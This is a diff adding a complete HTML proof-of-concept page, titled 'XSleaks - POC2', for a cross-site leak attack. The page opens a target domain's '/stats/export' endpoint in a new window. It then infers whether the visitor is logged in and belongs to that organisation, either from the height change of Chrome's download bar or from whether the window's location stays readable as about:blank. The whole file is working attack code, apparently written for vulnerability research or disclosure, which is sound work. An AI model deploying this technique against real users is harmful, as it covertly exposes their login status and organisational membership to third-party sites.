@@ -1,0 +1,74 @@
+<!doctype html>
+<html>
+    <head>
+        <title> XSleaks - POC2</title>
+        <style>
+            h1{
+                font-family: Arial, Helvetica, sans-serif;
+            }
+            input[type="text"]{
+                border: none;
+                padding: 10px;
+                box-sizing: border-box;
+                border: 1px solid grey;
+            }
+            
+            button{
+                border:none;
+                padding: 10px;
+                background: red;
+                color: white;
+            }
+            #result{
+                padding:20px;
+                width: 300px;
+                border: 1px solid grey;
+                font-family: Arial, Helvetica, sans-serif;
+                margin-top: 10px;
+                text-align: left;
+            }
+        </style>
+    </head>
+    <body>
+        <h1>XSLEAK POC</h1>
+        <input type="text" id="domain" placeholder="Enter domain name" />
+        <button id="click" onclick="initiateAttack();">Check </button>
+        <div id="result">
+            Result: <br /><br />
+
+        </div>
+        <script>
+            var initiateAttack = () => {
+                var domain = document.getElementById("domain").value;
+                var result = document.getElementById("result");
+                result.innerHTML = "Result:<br /><br />";
+                var windowHeight = window.innerHeight;
+                var downloadBarSize = 49;
+                var random_number = Math.floor((Math.random() * 100) + 1); //random number will be appended to the target URL to avoid caching
+                var url = "https://"+domain+"/stats/export?type=overview&date_range=30d&do_not_cache="+random_number;
+                if(win == null){
+                    var win = window.open();
+                    win.location = url;
+                }
+                setTimeout(() => {
+                    var margin = windowHeight - window.innerHeight;
+                    try{
+                        //condition one for download bar chrome the other one is for non-chromium browser e.g firefox
+                        if(margin == downloadBarSize || win.location.href == "about:blank"){
+                            result.innerHTML += "You are logged in <br /> and you belong to the organisation <strong>"+domain+"</strong>.";
+                            
+                        }else{
+                            result.innerHTML += "Either You are not logged in <br /> or you do not belong to the organisation <strong>"+domain+"</strong>."
+                        }
+                    }catch(error){
+                        //DOMException will occur if window.location.href does not point to blank
+                        result.innerHTML += "Either You are not logged in <br /> or you do not belong to the organisation <strong>"+domain+"</strong>."
+                    }
+                }, 10000);
+            }
+            
+        </script>
+
+    </body>
+
+</html>
